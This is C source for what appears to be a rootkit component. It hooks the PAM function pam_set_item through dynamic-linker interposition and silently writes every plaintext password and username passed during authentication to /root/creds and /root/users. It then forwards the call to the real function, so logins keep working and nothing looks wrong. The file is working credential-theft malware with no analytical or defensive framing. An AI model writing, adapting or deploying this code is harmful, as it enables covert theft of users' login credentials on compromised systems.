#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "prometheus.h"


void logmsg(char *file, char *msg) {
	FILE *f = fopen(file, "a+");
	if (f == NULL) {
		return;
	}
	fprintf(f, "%s\n", msg);
	fclose(f);
}
void lognum(char *file, long msg) {
	FILE *f = fopen(file, "a+");
	if (f == NULL) {
		return;
	}
	fprintf(f, "%ld\n", msg);
	fclose(f);
}

void init(void) {
	char *scall = "pam_set_item";
	struct_pam_auth.pam_func = dlsym(RTLD_NEXT, scall);
}

int pam_set_item (pam_handle_t *pamh, int item_type, const void *item) {
	init();
	void *authtok;
	char* pass = (char *)item;
	
	if(item_type == PAM_AUTHTOK) {
		if(item != NULL) {
			logmsg("/root/creds", pass);	
		}
	}
	else if (item_type == PAM_USER) {
		if(item != NULL) {
			logmsg("/root/users", pass);	
		}
	}
	
	long retval = (long)struct_pam_auth.pam_func(pamh, item_type, item);
	#ifdef DEBUG
		lognum("/root/retvals", retval);
	#endif
	return retval;
}
